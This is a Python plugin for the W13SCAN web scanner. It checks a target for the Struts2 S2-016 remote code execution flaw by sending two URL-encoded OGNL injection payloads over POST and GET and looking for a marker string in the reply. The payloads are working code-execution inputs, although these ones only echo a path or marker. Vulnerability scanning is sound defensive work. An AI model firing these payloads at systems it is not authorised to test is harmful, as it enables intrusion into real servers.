#coding   :utf-8
#file     : struts2_016.py
#author   : go0p
#time     : 2019/8/17 5:34 PM

import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase

class W13SCAN(PluginBase):
    name = 'Struts2-016远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            check = '<Struts2-vuln-Check>'
            payloads = [
                r"redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22<Struts2-vuln-%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().print(%23b),%23matt.getWriter().print('Check>'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D",
                r"redirect%3a%24%7b%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.print%28%27<Struts2-vuln%27%2b%27-Check>%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d",
               ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r1 = requests.post(url, headers=headers,data=payload)
                if check in r1.text:
                    out.success(url, self.name, playload="{}".format(payload), method="POST",check=check,raw=r1.raw)
                    return
                r2 = requests.get(netloc+'?'+payload,headers=headers,)
                if check in r2.text:
                    out.success(url, self.name, playload="{}".format(payload), method="GET",check=check,raw=r2.raw)
                    return

